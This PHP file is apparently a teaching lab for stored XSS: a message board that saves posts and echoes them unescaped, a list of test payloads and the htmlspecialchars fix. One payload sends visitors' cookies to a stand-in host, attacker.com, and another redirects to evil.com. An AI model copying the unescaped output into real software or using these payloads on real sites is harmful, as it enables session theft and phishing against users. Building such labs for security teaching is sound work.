<?php
/**
 * store_xss.php
 * 存储型 XSS 漏洞示例（仅用于学习，禁止非法用途）
 *
 * 漏洞成因：用户留言存入数据库后，输出时未转义
 * 利用方式：在留言框提交 XSS 代码，所有访问者都会触发
 */

// 模拟数据库（实际使用数据库）
$data_file = __DIR__ . '/messages.txt';
if (!file_exists($data_file)) {
    file_put_contents($data_file, '');
}

// 处理提交
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['message'])) {
    $username = isset($_POST['username']) ? $_POST['username'] : '匿名';
    $message = $_POST['message'];

    // 漏洞：直接存储用户输入，未做过滤
    $entry = json_encode([
        'username' => $username,
        'message' => $message,
        'time' => date('Y-m-d H:i:s')
    ]) . "\n";

    file_put_contents($data_file, $entry, FILE_APPEND);

    header('Location: store_xss.php');
    exit;
}

// 读取留言
$messages = [];
$lines = file($data_file, FILE_IGNORE_NEW_LINES);
foreach ($lines as $line) {
    $data = json_decode($line, true);
    if ($data) {
        $messages[] = $data;
    }
}
$messages = array_reverse($messages);  // 最新的在前面
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>存储型 XSS 示例 - 留言板</title>
</head>
<body>
    <h1>留言板（存储型 XSS）</h1>

    <!-- 留言表单 -->
    <form method="POST" action="">
        <p>
            昵称：<input type="text" name="username" placeholder="你的昵称">
        </p>
        <p>
            留言：<br>
            <textarea name="message" rows="4" cols="50" placeholder="说点什么..."></textarea>
        </p>
        <button type="submit">提交留言</button>
    </form>

    <hr>

    <h2>留言列表</h2>
    <?php if (empty($messages)): ?>
        <p>暂无留言，快来抢沙发吧！</p>
    <?php else: ?>
        <?php foreach ($messages as $msg): ?>
            <div style="border:1px solid #ccc; margin:10px 0; padding:10px;">
                <!-- 漏洞点：直接输出用户输入，未转义 -->
                <strong><?php echo $msg['username']; ?></strong>
                <small><?php echo $msg['time']; ?></small>
                <p><?php echo $msg['message']; ?></p>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>

    <hr>
    <h3>测试 Payload：</h3>
    <ul>
        <li>在留言框提交：<code>&lt;script&gt;alert('存储型XSS')&lt;/script&gt;</code></li>
        <li>窃取 Cookie：<code>&lt;img src=x onerror="new Image().src='http://attacker.com/steal?c='+document.cookie"&gt;</code></li>
        <li>跳转钓鱼：<code>&lt;script&gt;location.href='http://evil.com'&lt;/script&gt;</code></li>
    </ul>

    <hr>
    <h3>修复方法：</h3>
    <pre>echo htmlspecialchars($msg['message'], ENT_QUOTES, 'UTF-8');</pre>
</body>
</html>
